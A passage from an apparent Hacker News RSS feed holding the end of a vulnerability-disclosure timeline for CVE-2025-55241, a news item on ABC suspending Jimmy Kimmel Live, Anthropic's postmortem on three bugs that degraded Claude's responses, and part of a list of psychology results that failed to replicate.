  <li>July 17, 2025 - Microsoft pushed a fix for the issue globally into production.</li>
  <li>July 23, 2025 - Issue confirmed as resolved by MSRC.</li>
  <li>August 6, 2025 - Further mitigations pushed out preventing Actor tokens being issued for the Azure AD Graph with SP credentials.</li>
  <li>September 4, 2025 - <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55241">CVE-2025-55241</a> issued.</li>
  <li>September 17, 2025 - Release of this blogpost.</li>
</ul>



        
      </section>

      

      


      
  

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[ABC Pulls Jimmy Kimmel Live from the Air 'Indefinitely' (147 pts)]]></title>
            <link>https://www.vulture.com/article/abc-pulls-jimmy-kimmel-live-from-the-air-indefinitely.html</link>
            <guid>45282485</guid>
            <pubDate>Wed, 17 Sep 2025 23:00:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.vulture.com/article/abc-pulls-jimmy-kimmel-live-from-the-air-indefinitely.html">https://www.vulture.com/article/abc-pulls-jimmy-kimmel-live-from-the-air-indefinitely.html</a>, See on <a href="https://news.ycombinator.com/item?id=45282485">Hacker News</a></p>
<div id="readability-page-1" class="page"><section data-editable="main" data-track-zone="main">  <article role="main" data-track-type="article-detail" data-uri="www.vulture.com/_components/article/instances/cmfojo9bx000j0jik2r8w9h6u@published" data-content-channel="TV" data-crosspost="" data-type="Breaking-News-Original Reporting" data-syndication="original" data-headline="ABC Pulls Jimmy Kimmel Live! From the Air ‘Indefinitely’" data-authors="Josef Adalian" data-publish-date="2025-09-17" data-tags="tv, comedy, late night, jimmy kimmel live!, jimmy kimmel, politics, charlie kirk, vulture homepage lede" data-issue-date="" data-components-count="4" data-canonical-url="http://www.vulture.com/article/abc-pulls-jimmy-kimmel-live-from-the-air-indefinitely.html">


  
  
  
  <header>
    <div>
          

            <p><span data-editable="bylines">
            <p><span>By</span> <span>
        ,
          <span>who has covered the television industry since 1992</span><span>&nbsp;</span>
          <span>and writes Buffering, a newsletter about streaming</span>
      </span></p>

              </span>
          </p>
        </div>
    
  </header>
  <section>
    
    <div id="vulture-zephr-anchor" data-editable="content">
      <div>
          <div>
            <picture> <source media="(min-resolution: 192dpi) and (min-width: 1180px), (-webkit-min-device-pixel-ratio: 2) and (min-width: 1180px)" srcset="https://pyxis.nymag.com/v1/imgs/8c0/d93/983356eab25f0dade8b73751d607a07a7f-jimmy-kimmel.2x.rhorizontal.w700.jpg 2x" width="700" height="467"> <source media="(min-width: 1180px) " srcset="https://pyxis.nymag.com/v1/imgs/8c0/d93/983356eab25f0dade8b73751d607a07a7f-jimmy-kimmel.rhorizontal.w700.jpg" width="700" height="467"> <source media="(min-resolution: 192dpi) and (min-width: 768px), (-webkit-min-device-pixel-ratio: 2) and (min-width: 768px)" srcset="https://pyxis.nymag.com/v1/imgs/8c0/d93/983356eab25f0dade8b73751d607a07a7f-jimmy-kimmel.2x.rhorizontal.w700.jpg 2x" width="700" height="467"> <source media="(min-width: 768px)" srcset="https://pyxis.nymag.com/v1/imgs/8c0/d93/983356eab25f0dade8b73751d607a07a7f-jimmy-kimmel.rhorizontal.w700.jpg" width="700" height="467"> <source media="(min-resolution: 192dpi), (-webkit-min-device-pixel-ratio: 2)" srcset="https://pyxis.nymag.com/v1/imgs/8c0/d93/983356eab25f0dade8b73751d607a07a7f-jimmy-kimmel.2x.rhorizontal.w700.jpg" width="700" height="467"> <img src="https://pyxis.nymag.com/v1/imgs/8c0/d93/983356eab25f0dade8b73751d607a07a7f-jimmy-kimmel.rhorizontal.w700.jpg" data-content-img="" alt="JIMMY KIMMEL" width="700" height="467" fetchpriority="high"> </picture>
          </div>
            <div>
              <p><span>Photo: Randy Holmes/Disney via Getty Images</span>
              </p>
            </div>
              </div>
        <p data-editable="text" data-uri="www.vulture.com/_components/clay-paragraph/instances/cmfojo9bx000i0jik5fd1vt55@published" data-word-count="65">Conservative cancel culture has come for Jimmy Kimmel: Walt Disney–owned ABC has announced it’s pulling new episodes of <em>Jimmy Kimmel Live! </em>“indefinitely” following right-wing outrage over comments he made on his September 15 show about the reaction to the <a href="https://nymag.com/intelligencer/article/charlie-kirk-shooting-at-utah-university-q-and-a-live-updates.html">killing of right-wing podcaster and provocateur Charlie Kirk</a>. Disney’s&nbsp;decision follows a move by one of its major affiliate groups, Nexstar, to preempt the show in response.</p>

  <p data-editable="text" data-uri="www.vulture.com/_components/clay-paragraph/instances/cmfokcub900253b74tnikyb3l@published" data-word-count="133">While Nexstar didn’t say exactly what Kimmel had said that it objected to, and ABC offered no further explanation of its move, FCC chairman Brendan Carr earlier on Wednesday denounced this part of the host’s Monday monologue, <a href="https://deadline.com/2025/09/fcc-jimmy-kimmel-charlie-kirk-suspect-1236547238/">per Deadline</a>: “We had some new lows over the weekend with the MAGA gang desperately trying to characterize this kid who murdered Charlie Kirk as anything other than one of them and with everything they can to score political points from it.” Around 6 p.m. ET Wednesday, Nexstar issued this statement: “Nexstar strongly objects to recent comments made by Mr. Kimmel concerning the killing of Charlie Kirk and will replace the show with other programming in its ABC-affiliated markets.” When Vulture asked ABC for comment, a network rep replied, “<em>Jimmy Kimmel Live!</em> will be preempted indefinitely.”</p>

  <p data-editable="text" data-uri="www.vulture.com/_components/clay-paragraph/instances/cmfokcub900263b74w1qr3a7v@published" data-word-count="28">Vulture has reached out to Kimmel’s reps for comment and asked Nexstar and ABC for additional clarification of today’s actions. We’ll update this story when we know more.</p>

  


    </div>

      


          



      <span>ABC Pulls <em>Jimmy Kimmel Live!</em> From the Air ‘Indefinitely’</span>



    <dialog>
      <span>
        <svg width="6" height="14" viewBox="0 0 6 14" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M4.84191 13.478C4.84191 13.826 4.64391 14 4.24791 14H1.54791C1.22391 14 1.06191 13.85 1.06191 13.55V10.85C1.06191 10.586 1.17591 10.454 1.40391 10.454H4.51791C4.73391 10.454 4.84191 10.574 4.84191 10.814V13.478ZM4.13991 8.708C4.12791 8.888 4.07391 9.02 3.97791 9.104C3.89391 9.176 3.74991 9.212 3.54591 9.212H2.30391C2.12391 9.212 2.00391 9.176 1.94391 9.104C1.89591 9.032 1.85991 8.918 1.83591 8.762L0.935906 1.058C0.923906 0.926 0.947906 0.823999 1.00791 0.751999C1.07991 0.679999 1.16991 0.643999 1.27791 0.643999H4.67991C4.91991 0.643999 5.02791 0.769999 5.00391 1.022L4.13991 8.708Z" fill="#DB2800"></path>
</svg>

      </span>
      <span></span>
      <span>
        <svg width="14" height="13" viewBox="0 0 14 13" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M12.9823 1.22855C13.1775 1.03329 13.1775 0.716709 12.9823 0.521447C12.787 0.326184 12.4704 0.326184 12.2751 0.521447L7.00185 5.79474L1.72855 0.521447C1.53329 0.326184 1.21671 0.326184 1.02145 0.521447C0.826184 0.716709 0.826184 1.03329 1.02145 1.22855L6.29474 6.50185L1.02145 11.7751C0.826184 11.9704 0.826184 12.287 1.02145 12.4823C1.21671 12.6775 1.53329 12.6775 1.72855 12.4823L7.00185 7.20896L12.2751 12.4823C12.4704 12.6775 12.787 12.6775 12.9823 12.4823C13.1775 12.287 13.1775 11.9704 12.9823 11.7751L7.70896 6.50185L12.9823 1.22855Z" fill="#DA4022"></path>
</svg>

      </span>
    </dialog>

  </section>
  

</article>

  

</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[ABC yanks Jimmy Kimmel's show 'indefinitely' after remarks about Charlie Kirk (376 pts)]]></title>
            <link>https://www.cnn.com/2025/09/17/media/jimmy-kimmel-charlie-kirk-trump-fcc-brendan-carr</link>
            <guid>45282482</guid>
            <pubDate>Wed, 17 Sep 2025 23:00:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnn.com/2025/09/17/media/jimmy-kimmel-charlie-kirk-trump-fcc-brendan-carr">https://www.cnn.com/2025/09/17/media/jimmy-kimmel-charlie-kirk-trump-fcc-brendan-carr</a>, See on <a href="https://news.ycombinator.com/item?id=45282482">Hacker News</a></p>
Couldn't get https://www.cnn.com/2025/09/17/media/jimmy-kimmel-charlie-kirk-trump-fcc-brendan-carr: Error: Request failed with status code 451]]></description>
        </item>
        <item>
            <title><![CDATA[A postmortem of three recent issues (284 pts)]]></title>
            <link>https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues</link>
            <guid>45281139</guid>
            <pubDate>Wed, 17 Sep 2025 20:41:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues">https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues</a>, See on <a href="https://news.ycombinator.com/item?id=45281139">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><div><p>Between August and early September, three infrastructure bugs intermittently degraded Claude's response quality. We've now resolved these issues and want to explain what happened.</p><p>In early August, a number of users began reporting degraded responses from Claude. These initial reports were difficult to distinguish from normal variation in user feedback. By late August, the increasing frequency and persistence of these reports prompted us to open an investigation that led us to uncover three separate infrastructure bugs.</p><p>To state it plainly: We never reduce model quality due to demand, time of day, or server load. The problems our users reported were due to infrastructure bugs alone.</p><p>We recognize users expect consistent quality from Claude, and we maintain an extremely high bar for ensuring infrastructure changes don't affect model outputs. In these recent incidents, we didn't meet that bar. The following postmortem explains what went wrong, why detection and resolution took longer than we would have wanted, and what we're changing to prevent similar future incidents.</p><p>We don't typically share this level of technical detail about our infrastructure, but the scope and complexity of these issues justified a more comprehensive explanation.</p><h2 id="how-we-serve-claude-at-scale">How we serve Claude at scale</h2><p>We serve Claude to millions of users via our first-party API, Amazon Bedrock, and Google Cloud's Vertex AI. We deploy Claude across multiple hardware platforms, namely AWS Trainium, NVIDIA GPUs, and Google TPUs. This approach provides the capacity and geographic distribution necessary to serve users worldwide.</p><p>Each hardware platform has different characteristics and requires specific optimizations. Despite these variations, we have strict equivalence standards for model implementations. Our aim is that users should get the same quality responses regardless of which platform serves their request. This complexity means that any infrastructure change requires careful validation across all platforms and configurations.</p><h2 id="timeline-of-events">Timeline of events</h2><div><figure><img alt="Illustrative timeline of events on the Claude API. Yellow: issue detected, Red: degradation worsened, Green: fix deployed." loading="lazy" width="3840" height="1800" decoding="async" data-nimg="1" srcset="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2Fd707dfc2effceba608d04007bc776132a3e57838-3840x1800.png&amp;w=3840&amp;q=75 1x" src="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2Fd707dfc2effceba608d04007bc776132a3e57838-3840x1800.png&amp;w=3840&amp;q=75"><figcaption>Illustrative timeline of events on the <strong>Claude API</strong>. Yellow: issue detected, Red: degradation worsened, Green: fix deployed.</figcaption></figure></div><p>The overlapping nature of these bugs made diagnosis particularly challenging. The first bug was introduced on August 5, affecting approximately 0.8% of requests made to Sonnet 4. Two more bugs arose from deployments on August 25 and 26.</p><p>Although initial impacts were limited, a load balancing change on August 29 started to increase affected traffic. This caused many more users to experience issues while others continued to see normal performance, creating confusing and contradictory reports.</p><h2 id="three-overlapping-issues">Three overlapping issues</h2><p>Below we describe the three bugs that caused the degradation, when they occurred, and how we resolved them:</p><h3 id="1-context-window-routing-error">1. Context window routing error</h3><p>On August 5, some Sonnet 4 requests were misrouted to servers configured for the upcoming <a href="https://docs.claude.com/en/docs/build-with-claude/context-windows#1m-token-context-window">1M token</a> <a href="https://docs.claude.com/en/docs/build-with-claude/context-windows">context window</a>. This bug initially affected 0.8% of requests. On August 29, a routine load balancing change unintentionally increased the number of short-context requests routed to the 1M context servers. At the worst impacted hour on August 31, 16% of Sonnet 4 requests were affected.</p><p>Approximately 30% of Claude Code users who made requests during this period had at least one message routed to the wrong server type, resulting in degraded responses. On Amazon Bedrock, misrouted traffic peaked at 0.18% of all Sonnet 4 requests from August 12. Incorrect routing affected less than 0.0004% of requests on Google Cloud's Vertex AI between August 27 and September 16.</p><p>However, some users were affected more severely, as our routing is "sticky". This meant that once a request was served by the incorrect server, subsequent follow-ups were likely to be served by the same incorrect server.</p><p><strong>Resolution:</strong> We fixed the routing logic to ensure short- and long-context requests were directed to the correct server pools. We deployed the fix on September 4. A rollout to our first-party platforms and Google Cloud’s Vertex was completed by September 16. The fix is in the process of being rolled out on Bedrock.</p><h3 id="2-output-corruption">2. Output corruption</h3><p>On August 25, we deployed a misconfiguration to the Claude API TPU servers that caused an error during token generation. An issue caused by a runtime performance optimization occasionally assigned a high probability to tokens that should rarely be produced given the context, for example producing Thai or Chinese characters in response to English prompts, or producing obvious syntax errors in code. A small subset of users that asked a question in English might have seen "สวัสดี" in the middle of the response, for example.</p><p>This corruption affected requests made to Opus 4.1 and Opus 4 on August 25-28, and requests to Sonnet 4 August 25–September 2. Third-party platforms were not affected by this issue.</p><p><strong>Resolution:</strong> We identified the issue and rolled back the change on September 2. We've added detection tests for unexpected character outputs to our deployment process.</p><h3 id="3-approximate-top-k-xlatpu-miscompilation">3. Approximate top-k XLA:TPU miscompilation</h3><p>On August 25, we deployed code to improve how Claude selects tokens during text generation. This change inadvertently triggered a latent bug in the XLA:TPU<sup>[1] </sup>compiler, which has been confirmed to affect requests to Claude Haiku 3.5.</p><p>We also believe this could have impacted a subset of Sonnet 4 and Opus 3 on the Claude API. Third-party platforms were not affected by this issue.</p><p><strong>Resolution:</strong> We first observed the bug affecting Haiku 3.5 and rolled it back on September 4. We later noticed user reports of problems with Opus 3 that were compatible with this bug, and rolled it back on September 12. After extensive investigation we were unable to reproduce this bug on Sonnet 4 but decided to also roll it back out of an abundance of caution.</p><p>Simultaneously, we have (a) been working with the XLA:TPU team on a fix for the compiler bug and (b) rolled out a fix to use exact top-k with enhanced precision. For details, see the deep dive below.</p><h2 id="a-closer-look-at-the-xla-compiler-bug">A closer look at the XLA compiler bug</h2><p>To illustrate the complexity of these issues, here's how the XLA compiler bug manifested and why it proved particularly challenging to diagnose.</p><p>When Claude generates text, it calculates probabilities for each possible next word, then randomly chooses a sample from this probability distribution. We use "top-p sampling" to avoid nonsensical outputs—only considering words whose cumulative probability reaches a threshold (typically 0.99 or 0.999). On TPUs, our models run across multiple chips, with probability calculations happening in different locations. To sort these probabilities, we need to coordinate data between chips, which is complex.<sup>[2]</sup></p><p>In December 2024, we discovered our TPU implementation would occasionally drop the most probable token when <a href="https://docs.claude.com/en/docs/about-claude/glossary#temperature">temperature</a> was zero. We deployed a workaround to fix this case.</p><div><figure><img alt="Code snippet of a December 2024 patch to work around the unexpected dropped token bug when temperature = 0." loading="lazy" width="2000" height="500" decoding="async" data-nimg="1" srcset="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2Fefee0d3d25f6b03cbfc57e70e0e364dcd8b82fe0-2000x500.png&amp;w=2048&amp;q=75 1x, https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2Fefee0d3d25f6b03cbfc57e70e0e364dcd8b82fe0-2000x500.png&amp;w=3840&amp;q=75 2x" src="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2Fefee0d3d25f6b03cbfc57e70e0e364dcd8b82fe0-2000x500.png&amp;w=3840&amp;q=75"><figcaption>Code snippet of a December 2024 patch to work around the unexpected dropped token bug when temperature = 0.</figcaption></figure></div><p>The root cause involved mixed precision arithmetic. Our models compute next-token probabilities in <a href="https://github.com/tensorflow/tensorflow/blob/f41959ccb2d9d4c722fe8fc3351401d53bcf4900/tensorflow/core/framework/bfloat16.h">bf16</a> (16-bit floating point). However, the vector processor is <a href="https://dl.acm.org/doi/pdf/10.1145/3360307">fp32-native</a>, so the TPU compiler (XLA) can optimize runtime by converting some operations to fp32 (32-bit). This optimization pass is guarded by the <code>xla_allow_excess_precision</code> flag which defaults to true.</p><p>This caused a mismatch: operations that should have agreed on the highest probability token were running at different precision levels. The precision mismatch meant they didn't agree on which token had the highest probability. This caused the highest probability token to sometimes disappear from consideration entirely.</p><p>On August 26, we deployed a rewrite of our sampling code to fix the precision issues and improve how we handled probabilities at the limit that reach the top-p threshold. But in fixing these problems, we exposed a trickier one.</p><div><figure><img alt="Code snippet showing minimized reproducer merged as part of the August 11 change that root-caused the “bug” being worked around in December 2024; in reality, it’s expected behavior of the xla_allow_excess_precision flag." loading="lazy" width="2000" height="2560" decoding="async" data-nimg="1" srcset="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F6d10e58c0bd5fd7cb03dc0adc716cb1e4f039343-2000x2560.png&amp;w=2048&amp;q=75 1x, https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F6d10e58c0bd5fd7cb03dc0adc716cb1e4f039343-2000x2560.png&amp;w=3840&amp;q=75 2x" src="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F6d10e58c0bd5fd7cb03dc0adc716cb1e4f039343-2000x2560.png&amp;w=3840&amp;q=75"><figcaption>Code snippet showing a minimized reproducer merged as part of the August 11 change that root-caused the "bug" being worked around in December 2024. In reality, it’s expected behavior of the <code>xla_allow_excess_precision</code> flag.</figcaption></figure></div><p>Our fix removed the December workaround because we believed we'd solved the root cause. This led to a deeper bug in the <a href="https://docs.jax.dev/en/latest/_autosummary/jax.lax.approx_max_k.html">approximate top-k</a> operation—a performance optimization that quickly finds the highest probability tokens.<sup>[3]</sup> This approximation sometimes returned completely wrong results, but only for certain batch sizes and model configurations. The December workaround had been inadvertently masking this problem.</p><div><figure><img alt="Slack message showing reproducer of the underlying approximate top-k bug shared with the XLA:TPU engineers who developed the algorithm. The code returns correct results when run on CPUs." loading="lazy" width="2400" height="1404" decoding="async" data-nimg="1" srcset="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F7e42db934d0e84ea40fc56b416ddb09b2097a5ff-2400x1404.png&amp;w=3840&amp;q=75 1x" src="https://www.anthropic.com/_next/image?url=https%3A%2F%2Fwww-cdn.anthropic.com%2Fimages%2F4zrzovbb%2Fwebsite%2F7e42db934d0e84ea40fc56b416ddb09b2097a5ff-2400x1404.png&amp;w=3840&amp;q=75"><figcaption>Reproducer of the underlying approximate top-k bug shared with the XLA:TPU engineers who <a href="https://arxiv.org/pdf/2206.14286">developed the algorithm</a>. The code returns correct results when run on CPUs.</figcaption></figure></div><p>The bug's behavior was frustratingly inconsistent. It changed depending on unrelated factors such as what operations ran before or after it, and whether debugging tools were enabled. The same prompt might work perfectly on one request and fail on the next.</p><p>While investigating, we also discovered that the exact top-k operation no longer had the prohibitive performance penalty it once did. We switched from approximate to exact top-k and standardized some additional operations on fp32 precision.<sup>[4]</sup> Model quality is non-negotiable, so we accepted the minor efficiency impact.</p><h2 id="why-detection-was-difficult">Why detection was difficult</h2><p>Our validation process ordinarily relies on benchmarks alongside safety evaluations and performance metrics. Engineering teams perform spot checks and deploy to small "canary" groups first.</p><p>These issues exposed critical gaps that we should have identified earlier. The evaluations we ran simply didn't capture the degradation users were reporting, in part because Claude often recovers well from isolated mistakes. Our own privacy practices also created challenges in investigating reports. Our internal privacy and security controls limit how and when engineers can access user interactions with Claude, in particular when those interactions are not reported to us as feedback. This protects user privacy but prevents engineers from examining the problematic interactions needed to identify or reproduce bugs.</p><p>Each bug produced different symptoms on different platforms at different rates. This created a confusing mix of reports that didn't point to any single cause. It looked like random, inconsistent degradation.</p><p>More fundamentally, we relied too heavily on noisy evaluations. Although we were aware of an increase in reports online, we lacked a clear way to connect these to each of our recent changes. When negative reports spiked on August 29, we didn't immediately make the connection to an otherwise standard load balancing change.</p><h2 id="what-were-changing">What we're changing</h2><p>As we continue to improve our infrastructure, we're also improving the way we evaluate and prevent bugs like those discussed above across all platforms where we serve Claude. Here's what we're changing:</p><ul><li><strong>More sensitive evaluations:</strong> To help discover the root cause of any given issue, we’ve developed evaluations that can more reliably differentiate between working and broken implementations. We’ll keep improving these evaluations to keep a closer eye on model quality.</li><li><strong>Quality evaluations in more places:</strong> Although we run regular evaluations on our systems, we will run them continuously on true production systems to catch issues such as the context window load balancing error.</li><li><strong>Faster debugging tooling:</strong> We'll develop infrastructure and tooling to better debug community-sourced feedback without sacrificing user privacy. Additionally, some bespoke tools developed here will be used to reduce the remediation time in future similar incidents, if those should occur.</li></ul><p>Evals and monitoring are important. But these incidents have shown that we also need continuous signal from users when responses from Claude aren't up to the usual standard. Reports of specific changes observed, examples of unexpected behavior encountered, and patterns across different use cases all helped us isolate the issues.</p><p>It remains particularly helpful for users to continue to send us their feedback directly. You can use the <code>/bug</code> command in Claude Code or you can use the "thumbs down" button in the Claude apps to do so. Developers and researchers often create new and interesting ways to evaluate model quality that complement our internal testing. If you'd like to share yours, reach out to <a href="mailto:feedback@anthropic.com">feedback@anthropic.com</a>.</p><p>We remain grateful to our community for these contributions.</p><p><sup>[1]</sup> XLA:TPU is the optimizing compiler that translates <a href="https://openxla.org/xla/architecture">XLA</a> High Level Optimizing language—often written using <a href="https://docs.jax.dev/en/latest">JAX</a>—to TPU machine instructions.</p><p><sup>[2]</sup> Our models are too large for single chips and are partitioned across tens of chips or more, making our sorting operation a distributed sort. TPUs (just like GPUs and Trainium) also have different performance characteristics than CPUs, requiring different implementation techniques using vectorized operations instead of serial algorithms.</p><p><sup>[3]</sup> We had been using this approximate operation because it yielded substantial performance improvements. The approximation works by accepting potential inaccuracies in the lowest probability tokens, which shouldn't affect quality—except when the bug caused it to drop the highest probability token instead.</p><p><sup>[4]</sup> Note that the now-correct top-k implementation may result in slight differences in the inclusion of tokens near the top-p threshold, and in rare cases users may benefit from re-tuning their choice of top-p.</p></div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Famous cognitive psychology experiments that failed to replicate (154 pts)]]></title>
            <link>https://buttondown.com/aethermug/archive/aether-mug-famous-cognitive-psychology/</link>
            <guid>45279898</guid>
            <pubDate>Wed, 17 Sep 2025 18:55:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://buttondown.com/aethermug/archive/aether-mug-famous-cognitive-psychology/">https://buttondown.com/aethermug/archive/aether-mug-famous-cognitive-psychology/</a>, See on <a href="https://news.ycombinator.com/item?id=45279898">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><main components="[object Object]"><p><em>TL;DR is the part in bold below.</em></p>
<p>The field of psychology had a big crisis in the 2010s, when many widely accepted results turned out to be much less solid than previously thought. It's called the <a href="https://en.wikipedia.org/w/index.php?title=Replication_crisis" rel="nofollow noopener noreferrer" target="_blank">replication crisis</a>, because labs around the world tried and failed to replicate, in new experiments, previous results published by their original "discoverers". In other words, many reported psychological effects were either non-existent—artifacts of the experimenter's flawed setup—or so much weaker than originally claimed that they lost most of their intellectual sparkle.</p>
<p>(The crisis spanned other fields as well, but I mostly care about psychology here, especially the cognitive kind.)</p>
<p>This is very old news, and I've been vaguely aware of several of the biggest disgraced results for years, but I keep on forgetting which are (still probably) real and which aren't. This is not good. <em>Most</em> results in the field do actually replicate and are robust<sup>[citation needed]</sup>, so it would be a pity to lose confidence in the whole field just because of a few bad apples.</p>
<p><strong>This post is a compact reference list of the most (in)famous cognitive science results that failed to replicate and should, for the time being, be considered false.</strong> The only goal is to offset the trust-undermining effects of my poor memory—and perhaps yours, too?—with a bookmarkable page.</p>
<p>This can't be a comprehensive list: if a study is <em>not</em> on this page, it's not guaranteed to be fully replicated. Still, this should cover most of the high-profile debunked theories that laypeople like me may have heard of.</p>
<p><em>Credit: I enlisted the help of Kimi K2, o3, and Sonnet 4 to gather and fact-check this list. I also checked, pruned, and de-hallucinated all the results.</em></p>

<h3>Ego Depletion Effect</h3>
<ul>
<li><strong>Claimed result:</strong> We have a "willpower battery" that gradually depletes during the day as we exercise self-control. (I remember reading Baumeister's pop-science book and being awed by the implications of their findings; I might have known it sounded too good to be true.)</li>
<li><strong>Representative paper:</strong> <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2F0022-3514.74.5.1252" rel="nofollow noopener noreferrer" target="_blank">Baumeister et al. 1998</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://journals.sagepub.com/doi/10.1177/1745691616652873" rel="nofollow noopener noreferrer" target="_blank">Hagger et (63!) al. 2016</a></li>
</ul>
<h3>Power Posing Effect</h3>
<ul>
<li><strong>Claimed result:</strong> Adopting expansive body postures for 2 minutes (like standing with hands on hips or arms raised) increases testosterone, decreases cortisol, and makes people feel more powerful and take more risks.</li>
<li><strong>Representative paper:</strong> <a href="https://doi.org/10.1177/0956797610383437" rel="nofollow noopener noreferrer" target="_blank">Carney, Cuddy, &amp; Yap (2010)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://doi.org/10.1177/0956797614553946" rel="nofollow noopener noreferrer" target="_blank">Ranehill et al. (2015)</a></li>
</ul>
<h3>Social Priming: Elderly Words Effect</h3>
<ul>
<li><strong>Claimed result:</strong> People walk more slowly after being exposed to words related to elderly stereotypes.</li>
<li><strong>Representative paper:</strong> <a href="https://doi.org/10.1037/0022-3514.71.2.230" rel="nofollow noopener noreferrer" target="_blank">Bargh, Chen, &amp; Burrows (1996)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://doi.org/10.1371/journal.pone.0029081" rel="nofollow noopener noreferrer" target="_blank">Doyen et al. (2012)</a> (I like how they prove that the psychological effect was actually in the experimenters, rather than the subjects!)</li>
</ul>
<h3>Money Priming Effect</h3>
<ul>
<li><strong>Claimed result:</strong> Simply thinking about money makes you more selfish and more likely to endorse free market values.</li>
<li><strong>Representative paper:</strong> <a href="https://doi.org/10.1126/science.1132491" rel="nofollow noopener noreferrer" target="_blank">Vohs, Mead, &amp; Goode (2006)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://pubmed.ncbi.nlm.nih.gov/26214168/" rel="nofollow noopener noreferrer" target="_blank">Rohrer, Pashler, &amp; Harris (2015)</a></li>
</ul>
<h3>ESP Precognition Effect</h3>
<ul>
<li><strong>Claimed result:</strong> In some cases, people can predict future events "that could not otherwise be anticipated through any known inferential process".</li>
<li><strong>Representative paper:</strong> <a href="https://doi.org/10.1037/a0021524" rel="nofollow noopener noreferrer" target="_blank">Bem (2011)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://doi.org/10.1037/a0029709" rel="nofollow noopener noreferrer" target="_blank">Galak et al. (2012)</a>, <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0033423" rel="nofollow noopener noreferrer" target="_blank">Ritchie, Wiseman, &amp; French (2012)</a></li>
</ul>
<h3>Cleanliness and Morality Effect</h3>
<ul>
<li><strong>Claimed result:</strong> Being clean or thinking about cleanliness makes people more morally lax.</li>
<li><strong>Representative paper:</strong> <a href="https://doi.org/10.1111/j.1467-9280.2008.02227.x" rel="nofollow noopener noreferrer" target="_blank">Schnall, Benton, &amp; Harvey (2008)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://doi.org/10.1027/1864-9335/a000186" rel="nofollow noopener noreferrer" target="_blank">Johnson, Cheung, &amp; Donnellan (2014)</a></li>
</ul>
<h3>Glucose and Ego Depletion Effect</h3>
<ul>
<li><strong>Claimed result:</strong> Connected to the debunked ego-depletion effect, this one claims that adding glucose to your blood "recharges" the willpower battery. (For a while, I may have drunk more orange juice than usual after reading Baumeister's book. At least it's healthy-ish.)</li>
<li><strong>Representative paper:</strong> <a href="https://doi.org/10.1037/0022-3514.92.2.325" rel="nofollow noopener noreferrer" target="_blank">Gailliot &amp; Baumeister (2007)</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://www.sciencedirect.com/science/article/abs/pii/S0195666313005072" rel="nofollow noopener noreferrer" target="_blank">Lange &amp; Eggert (2014)</a></li>
</ul>
<h3>Hunger and Risk-Taking Effect</h3>
<ul>
<li><strong>Claimed result:</strong> People exposed to the scent of freshly baked cookies become less sensitive to risk and take more risks to obtain food.</li>
<li><strong>Representative paper:</strong> <a href="https://onlinelibrary.wiley.com/doi/10.1002/bdm.520" rel="nofollow noopener noreferrer" target="_blank">Ditto et al. 2006</a></li>
<li><strong>Replication status:</strong> <em>did not replicate</em></li>
<li><strong>Source:</strong> <a href="https://doi.org/10.1016/j.foodqual.2018.02.014" rel="nofollow noopener noreferrer" target="_blank">Festjens, Bruyneel, &amp; Dewitte (2018)</a></li>
</ul>
<h3>Psychological Distance &amp; Construal Level Theory</h3>
<ul>
<li><strong>Claimed result</strong>: "Psychologically distant" events are processed more abstractly, while "psychologically near" events are processed more concretely. E.g., you worry about the difficulty of a task if you have to do it tomorrow, but you see the same task's attractive side if it is planned far in the future.</li>
<li><strong>Representative paper</strong>: <a href="https://pubmed.ncbi.nlm.nih.gov/20438233/" rel="nofollow noopener noreferrer" target="_blank">Trope &amp; Liberman (2010)</a>, building on <a href="https://nyuscholars.nyu.edu/en/publications/the-role-of-feasibility-and-desirability-considerations-in-near-a" rel="nofollow noopener noreferrer" target="_blank">Liberman &amp; Trope (1998)</a></li>
<li><strong>Replication status</strong>: <em>serious credibility problems</em></li>
